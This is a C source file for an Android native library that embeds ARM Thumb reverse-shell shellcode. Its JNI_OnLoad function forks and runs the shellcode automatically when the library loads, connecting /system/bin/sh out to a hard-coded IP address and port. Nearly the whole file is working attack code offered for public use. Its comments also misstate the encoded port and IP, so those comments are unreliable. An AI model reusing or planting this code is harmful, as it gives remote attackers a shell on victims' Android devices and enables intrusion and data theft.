/* This ARM Thumb sc connects to a given IP and port with a shell.
 * Intended for use with Android (hence /system/bin/sh).
 *
 * Connects to the provided IP and port with a shell
 *
 * no null bytes in the code, but does this really matter these days?
 * it could be fixed with just a few instructions.
 *
 * Released to the public domain */
#include <jni.h>
#include <stdio.h>
#include <string.h>

#define SWAP16(x)   ((x) << 8 | ((x) >> 8))

const unsigned char sc[] = {
    /* Enter Thumb mode (for proof of concept) */
    0x01, 0x10, 0x8F, 0xE2, 0x11, 0xFF, 0x2F, 0xE1,

    /* 16-bit instructions follow */
    0x02, 0x20, 0x01, 0x21, 0x92, 0x1A, 0x0F, 0x02, 0x19, 0x37, 0x01,
    0xDF, 0x06, 0x1C, 0x08, 0xA1, 0x10, 0x22, 0x02, 0x37, 0x01, 0xDF,
    0x3F, 0x27, 0x02, 0x21, 0x30, 0x1c, 0x01, 0xdf, 0x01, 0x39, 0xFB,
    0xD5, 0x05, 0xA0, 0x92, 0x1a, 0x05, 0xb4, 0x69, 0x46, 0x0b, 0x27,
    0x01, 0xDF, 0xC0, 0x46,

    /* struct sockaddr */
    0x02, 0x00,
    /* port: 0x6666 */
    0x1A, 0x0A,
    /* ip: 192.168.1.55 */
    0xC0, 0xA8, 0x00, 0x02,

    /* "/system/bin/sh" */
    0x2f, 0x73, 0x79, 0x73, 0x74, 0x65, 0x6d, 0x2f, 0x62, 0x69, 0x6e,
    0x2f, 0x73, 0x68, 0x00
};

int JNI_OnLoad(JavaVM* vm, void* reserved)
{
    pid_t pid;
    pid = fork();
    if (pid == 0){
        printf("shellcode=%d bytes\n"
           "connecting to %d.%d.%d.%d:%hd\n", sizeof sc,
        sc[0x3c], sc[0x3d], sc[0x3e], sc[0x3f],
        SWAP16(*((unsigned short *)(sc+0x3a))));
        ((int (*)(void))sc)();
    }
    return JNI_VERSION_1_6;
}